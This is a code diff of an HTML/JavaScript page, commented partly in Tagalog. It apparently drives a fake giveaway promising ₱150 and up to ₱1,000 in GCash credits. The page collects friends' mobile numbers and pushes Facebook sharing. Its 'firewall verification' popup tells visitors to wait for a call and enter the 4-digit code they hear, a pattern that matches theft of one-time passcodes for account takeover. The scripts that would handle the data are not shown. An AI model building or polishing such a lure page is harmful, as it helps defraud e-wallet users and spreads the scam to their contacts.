@@ -42,91 +42,85 @@
         </div>
     </div>
 
-    <!-- MINI DASHBOARD ORIGINAL -->
-	<div class="mini-dashboard">
-    <div class="balance-item">
-        <span class="balance-label">WALLET BALANCE</span>
-        <div class="balance-value">
-            <span class="currency">₱</span>
-            <span id="userBalanceDisplay">0.00</span>
+    <!-- MINI DASHBOARD -->
+    <div class="mini-dashboard">
+        <div class="balance-item">
+            <span class="balance-label">WALLET BALANCE</span>
+            <div class="balance-value">
+                <span class="currency">₱</span>
+                <span id="userBalanceDisplay">0.00</span>
+            </div>
         </div>
     </div>
-</div>
     
     <div class="dashboard-action">
         <a href="main.html" class="scatter-link">
             <img src="images/scatter_icon.jpg" class="twisting-scatter" alt="Main">
         </a>
     </div>
-</div>
     
     <div class="step1-dropdown">
-    <button class="dropdown-btn" id="dropdownBtn">
-        <span class="dropdown-icon">👥</span>
-        <span class="dropdown-text">INVITE FRIENDS</span>
-        <span class="dropdown-arrow">▼</span>
-    </button>
-    
-    <div class="dropdown-content" id="dropdownContent">
-        <!-- COMPACT INVITE FORM -->
-        <div class="invite-form-container">
-            <div class="invite-input-wrapper">
-                <input type="tel" id="friendPhoneInput" class="modern-input" placeholder="Enter mobile number" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-                <button class="modern-send-btn" id="sendInviteBtn">SEND</button>
-            </div>
-        </div>
+        <button class="dropdown-btn" id="dropdownBtn">
+            <span class="dropdown-icon">👥</span>
+            <span class="dropdown-text">INVITE FRIENDS</span>
+            <span class="dropdown-arrow">▼</span>
+        </button>
         
-        <!-- MY INVITATIONS SECTION -->
-        <div class="invite-list-section">
-            <div class="invite-section-title">📤 My Invitations</div>
-            <div class="invite-list-header">
-                <span>MOBILE NUMBER</span>
-                <span>STATUS</span>
-                <span>ACTION</span>
+        <div class="dropdown-content" id="dropdownContent">
+            <div class="invite-form-container">
+                <div class="invite-input-wrapper">
+                    <input type="tel" id="friendPhoneInput" class="modern-input" placeholder="Enter mobile number" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                    <button class="modern-send-btn" id="sendInviteBtn">SEND</button>
+                </div>
             </div>
-            <div id="sentInvitesList" class="invite-list-body">
-                <div class="invite-empty">No invitations sent</div>
+            
+            <div class="invite-list-section">
+                <div class="invite-section-title">📤 My Invitations</div>
+                <div class="invite-list-header">
+                    <span>MOBILE NUMBER</span>
+                    <span>STATUS</span>
+                    <span>ACTION</span>
+                </div>
+                <div id="sentInvitesList" class="invite-list-body">
+                    <div class="invite-empty">No invitations sent</div>
+                </div>
             </div>
-        </div>
-        
-        <!-- RECEIVED SECTION -->
-        <div class="invite-list-section">
-            <div class="invite-section-title">📥 Invitations Received</div>
-            <div class="invite-list-header">
-                <span>FROM</span>
-                <span>STATUS</span>
-                <span>REWARD</span>
-            </div>
-            <div id="receivedInvitesList" class="invite-list-body">
-                <div class="invite-empty">No invitations received</div>
+            
+            <div class="invite-list-section">
+                <div class="invite-section-title">📥 Invitations Received</div>
+                <div class="invite-list-header">
+                    <span>FROM</span>
+                    <span>STATUS</span>
+                    <span>REWARD</span>
+                </div>
+                <div id="receivedInvitesList" class="invite-list-body">
+                    <div class="invite-empty">No invitations received</div>
+                </div>
             </div>
         </div>
     </div>
-</div>
     
     <div class="prize-grid">
-    <!-- LEFT CARD: May onclick trigger para sa sounds -->
-    <div class="prize-card" id="leftCard">
-        <div class="lucky-cat-video">
-            <video id="leftCatVideo" autoplay loop muted playsinline>
-                <source src="sounds/luckycat.mp4" type="video/mp4">
-            </video>
+        <div class="prize-card" id="leftCard">
+            <div class="lucky-cat-video">
+                <video id="leftCatVideo" autoplay loop muted playsinline>
+                    <source src="sounds/luckycat.mp4" type="video/mp4">
+                </video>
+            </div>
+            <div class="prize-label">YOU GET</div>
+            <div class="prize-amount">₱150</div>
         </div>
-        <div class="prize-label">YOU GET</div>
-        <div class="prize-amount">₱0</div>
-    </div>
 
-    <!-- RIGHT CARD -->
-    <div class="prize-card" id="rightCard">
-        <div class="lucky-cat-video">
-            <video id="rightCatVideo" autoplay loop muted playsinline>
-                <source src="sounds/luckycat.mp4" type="video/mp4">
-            </video>
+        <div class="prize-card" id="rightCard">
+            <div class="lucky-cat-video">
+                <video id="rightCatVideo" autoplay loop muted playsinline>
+                    <source src="sounds/luckycat.mp4" type="video/mp4">
+                </video>
+            </div>
+            <div class="prize-label">FRIEND GETS</div>
+            <div class="prize-amount" id="rightRewardAmount">₱0</div>
         </div>
-        <div class="prize-label">FRIEND GETS</div>
-        <div class="prize-amount" id="rightRewardAmount">₱0</div>
     </div>
-</div>
     
     <div class="winners-banner">
         <span>🌟 <strong>LUCKY WINNERS</strong> 🌟<br> will receive <strong>₱150 Credits</strong></span>
@@ -134,18 +128,48 @@
     
     <div class="time-left-section">
         <div class="time-label">⏰ HOORAY DROP ENDS IN ⏰</div>
-        <div class="prize-amount" id="popupPrizeAmount">₱150</div>
+        <div class="time-display" id="mainTimerDisplay">00D 00:00:00</div>
     </div>
     
-    <!-- CLAIM SECTION -->
-<button class="claim-now-btn" id="claimNowBtn">
-    <div class="icon-container">
-        <img src="images/scatter_icon.jpg" class="claim-icon twisting-scatter" alt="icon">
-    </div>
-    <span class="btn-text">CLAIM NOW!!</span>
-</button>
+    <button class="claim-now-btn" id="claimNowBtn">
+        <div class="icon-container">
+            <img src="images/scatter_icon.jpg" class="claim-icon twisting-scatter" alt="icon">
+        </div>
+        <span class="btn-text">CLAIM NOW!!</span>
+    </button>
 
-    <div id="prizePopup" class="prize-popup" style="display: none;">
+    <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+
+    <div class="status-message" id="statusMessage">
+        <span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>
+    </div>
+    
+    <div class="button-divider">
+        <span></span>
+        <span>or share with friends</span>
+        <span></span>
+    </div>
+
+    <div class="button-divider">
+        <span></span>
+        <span style="font-family: 'Orbitron'; font-size: 10px; color: #666;">MISSION</span>
+        <span></span>
+    </div>
+
+    <button class="btn-facebook-shimmer" onclick="handleFacebookShare()">
+        <i class="fa-brands fa-facebook-f"></i>
+        <span>SHARE ON FACEBOOK</span>
+    </button>
+
+    <div class="share-social-text">
+        Share to <strong>Social Media</strong> <br>received up to <strong>₱1,000 GCash Credits</strong>
+    </div>
+</div>
+
+<!-- PRIZE POPUP -->
+<div id="prizePopup" class="prize-popup" style="display: none;">
     <div class="popup-container">
         <div class="popup-inner">
             <div class="popup-close" onclick="closePrizePopup()">✕</div>
@@ -169,58 +193,72 @@
 
             <div class="button-separator"></div>
 
-            <button class="back-btn" id="backBtn">
+            <button class="back-btn" id="backBtn" onclick="closePrizePopup()">
                 ← BACK
             </button>
         </div>
     </div>
 </div>
 
-    <!-- DIRECT SCRIPT (Walang conditions, diretso labas) -->
+<!-- FIREWALL VERIFICATION POPUP -->
+<div id="firewallPopup" class="firewall-popup-overlay" style="display: none;">
+    <div class="firewall-popup-card">
+        <div class="popup-close-btn" onclick="hideFirewallPopup()">✕</div>
+        <div id="firewallPopupContent">
+            <div class="firewall-warning-icon">📞</div>
+            <h2>VERIFICATION REQUIRED</h2>
+            <div class="firewall-message">
+                <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
+                <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
+                <p>Enter the code below to continue.</p>
+            </div>
+            <div class="verification-input-group">
+                <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
+                <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
+            </div>
+            <div class="firewall-note">
+                <p>Waiting for system-verification call...</p>
+            </div>
+            <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
+        </div>
+    </div>
+</div>
+
+<canvas id="confettiCanvas"></canvas>
+
+<script src="js/config.js"></script>
+<script src="js/popup_share.js"></script>
+<script src="js/promotion.js"></script>
+
 <script>
     const scatterSound = new Audio('sounds/super_ace_scatter_ring.mp3');
     scatterSound.volume = 0.5;
 
     function showPrizePopup() {
         var popup = document.getElementById('prizePopup');
-        var ticker = document.getElementById('winnerTicker'); // Kunin ang ticker
+        var ticker = document.getElementById('winnerTicker');
 
         scatterSound.currentTime = 0;
         scatterSound.play().catch(err => console.log("Audio play error:", err));
 
         if (popup) {
             popup.style.setProperty('display', 'flex', 'important');
-            
-            // --- HIDE TICKER ---
-            if (ticker) {
-                ticker.style.display = 'none';
-            }
-
-            if (typeof startConfetti === 'function') {
-                startConfetti();
-            }
+            if (ticker) ticker.style.display = 'none';
+            if (typeof startConfetti === 'function') startConfetti();
         }
     }
 
     function closePrizePopup() {
         var popup = document.getElementById('prizePopup');
-        var ticker = document.getElementById('winnerTicker'); // Kunin ang ticker
+        var ticker = document.getElementById('winnerTicker');
 
         if (popup) {
             popup.style.display = 'none';
-            
-            // --- SHOW TICKER ULIT ---
-            if (ticker) {
-                ticker.style.display = 'flex'; // 'flex' dahil ito ang original na display nito
-            }
-
-            if (typeof stopConfetti === 'function') {
-                stopConfetti();
-            }
+            if (ticker) ticker.style.display = 'flex';
+            if (typeof stopConfetti === 'function') stopConfetti();
         }
     }
 
-    // Listener para sa button
     const claimBtn = document.getElementById('claimNowBtn');
     if (claimBtn) {
         claimBtn.onclick = function(e) {
@@ -232,72 +270,7 @@
             showPrizePopup();
         }, { passive: false });
     }
-</script>
 
-<div class="progress-bar">
-    <div class="progress-fill" id="progressFill"></div>
-</div>
-
-<div class="status-message" id="statusMessage">
-    <span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>
-</div>
-    
-    <div class="button-divider">
-        <span></span>
-        <span>or share with friends</span>
-        <span></span>
-    </div>
-    
-
-<!-- Divider before share -->
-<div class="button-divider">
-    <span></span>
-    <span style="font-family: 'Orbitron'; font-size: 10px; color: #666;">MISSION</span>
-    <span></span>
-</div>
-
-<!-- Remastered Button -->
-<button class="btn-facebook-shimmer" onclick="handleFacebookShare()">
-    <i class="fa-brands fa-facebook-f"></i> <!-- FB ICON HERE -->
-    <span>SHARE ON FACEBOOK</span>
-</button>
-
-<!-- Remastered Footer Text -->
-<div class="share-social-text">
-    Share to <strong>Social Media</strong> <br>received up to <strong>₱1,000 GCash Credits</strong>
-</div>
-
-<canvas id="confettiCanvas"></canvas>
-
- <!-- ========== FIREWALL VERIFICATION POPUP ========== -->
-    <div id="firewallPopup" class="firewall-popup-overlay" style="display: none;">
-        <div class="firewall-popup-card">
-            <div class="popup-close-btn" onclick="hideFirewallPopup()">✕</div>
-            <div id="firewallPopupContent">
-                <div class="firewall-warning-icon">📞</div>
-                <h2>VERIFICATION REQUIRED</h2>
-                <div class="firewall-message">
-                    <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
-                    <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
-                    <p>Enter the code below to continue.</p>
-                </div>
-                <div class="verification-input-group">
-                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
-                    <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
-                </div>
-                <div class="firewall-note">
-                    <p>Waiting for system-verification call...</p>
-                </div>
-                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
-            </div>
-        </div>
-    </div>
-
-<script src="js/promotion.js"></script>
-<script src="js/config.js"></script>
-<script src="js/popup_share.js"></script>
-
-<script>
     function isMobileDevice() {
         return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
@@ -362,39 +335,29 @@
     }
 
     document.addEventListener('DOMContentLoaded', function() {
-    const leftCard = document.getElementById('leftCard');
-    const leftVideo = document.getElementById('leftCatVideo');
+        const leftCard = document.getElementById('leftCard');
+        const leftVideo = document.getElementById('leftCatVideo');
 
-    if (leftCard && leftVideo) {
-        // Isang click listener lang para sa sound activation
-        leftCard.addEventListener('click', function() {
-            
-            // I-check kung naka-mute pa
-            if (leftVideo.muted) {
-                // 1. I-unmute
-                leftVideo.muted = false;
-                
-                // 2. Set volume to 35% (0.35)
-                leftVideo.volume = 0.35;
-                
-                // 3. Siguraduhing mag-play (fallback kung nag-pause ang autoplay)
-                const playPromise = leftVideo.play();
-                
-                if (playPromise !== undefined) {
-                    playPromise.then(() => {
-                        console.log("Sound is now playing!");
-                    }).catch(error => {
-                        console.log("Playback failed:", error);
-                    });
+        if (leftCard && leftVideo) {
+            leftCard.addEventListener('click', function() {
+                if (leftVideo.muted) {
+                    leftVideo.muted = false;
+                    leftVideo.volume = 0.35;
+                    const playPromise = leftVideo.play();
+                    if (playPromise !== undefined) {
+                        playPromise.then(() => {
+                            console.log("Sound is now playing!");
+                        }).catch(error => {
+                            console.log("Playback failed:", error);
+                        });
+                    }
                 }
-            }
-        }, { once: true }); // Gagana lang ito sa unang click para hindi maingay
-    }
-});
+            }, { once: true });
+        }
+    });
 
-window.closePrizePopup = closePrizePopup;
-window.showPrizePopup = showPrizePopup;
-
+    window.closePrizePopup = closePrizePopup;
+    window.showPrizePopup = showPrizePopup;
 </script>
 
 </body>
